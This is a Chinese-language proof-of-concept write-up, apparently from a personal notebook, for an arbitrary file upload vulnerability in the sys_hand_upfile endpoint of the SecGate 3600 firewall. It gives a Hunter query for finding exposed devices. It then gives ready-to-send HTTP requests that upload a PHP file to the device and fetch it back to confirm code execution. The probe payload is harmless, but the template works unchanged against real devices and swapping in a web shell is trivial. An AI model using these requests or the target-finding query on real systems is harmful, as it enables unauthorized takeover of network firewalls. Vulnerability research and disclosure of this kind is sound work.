# 网神SecGata 3600防火墙sys_hand_upfile任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">网神 SecGate 3600 防火墙 sys_hand_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 网神SecGata 3600防火墙

# 三、资产测绘
    - hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"`

![1691631315585-e71862e7-a889-460a-b2f7-a14e396c2f9b.png](./img/W5YK0CmTgjGYZMx7/1691631315585-e71862e7-a889-460a-b2f7-a14e396c2f9b-558082.png)

+ 登录页面

![1691631344474-a4ef0b41-65a2-4221-8212-3ca32e0b0b40.png](./img/W5YK0CmTgjGYZMx7/1691631344474-a4ef0b41-65a2-4221-8212-3ca32e0b0b40-349914.png)

# 四、漏洞复现
```plain
POST /?g=sys_hand_upfile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)
Content-Length: 261
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=cmqfdwckb52z6zvzzjgm
Connection: close

--cmqfdwckb52z6zvzzjgm
Content-Disposition: form-data; name="upfile"; filename="7litvvzvnk.php"

<?php echo 111*111;unlink(__FILE__);?>
--cmqfdwckb52z6zvzzjgm
Content-Disposition: form-data; name="submit_post"

sys_hand_upfile
--cmqfdwckb52z6zvzzjgm--
```

![1706024999167-a34f561c-297b-47a9-a171-ec6bb308ca82.png](./img/W5YK0CmTgjGYZMx7/1706024999167-a34f561c-297b-47a9-a171-ec6bb308ca82-529354.png)

上传文件位置

```plain
GET /attachements/7litvvzvnk.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)
Connection: close
Cookie: __s_sessionid__=jvdi0lqirs2c3ilvut5t2qluv6
Accept-Encoding: gzip, deflate
```

![1706025015329-f5902d0c-5062-41fc-96c5-2cbfe53ad317.png](./img/W5YK0CmTgjGYZMx7/1706025015329-f5902d0c-5062-41fc-96c5-2cbfe53ad317-870523.png)



> 更新: 2024-02-29 23:57:16  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zbdg597pe4ckn0gk>